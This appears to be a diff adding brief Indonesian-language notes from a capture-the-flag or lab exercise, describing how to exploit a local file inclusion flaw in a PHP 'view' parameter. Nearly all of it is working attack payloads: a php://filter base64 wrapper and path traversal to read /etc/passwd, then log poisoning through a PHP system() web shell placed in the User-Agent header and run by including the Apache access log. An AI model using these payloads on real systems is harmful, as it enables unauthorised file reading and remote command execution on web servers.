@@ -1,0 +1,9 @@
+- step :
+> ke: http://ip/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext=
+> cari tau apa aja yg bisa di cek kalo ada lfi
+> langsung ini juga bisa: http://ip/?view=dog/../../../../etc/passwd&ext= 
+> baca wu bisa rce lewat header -> User-Agent: <?php system($_GET['comd']); ?>
+> /?view=dog/../../../../../var/log/apache2/access.log&ext=&comd=id
+> bisa tuh rce nya, tinggal ls2 aja cat2 aja di burpsuite aman dah pokoknya
+
+ 
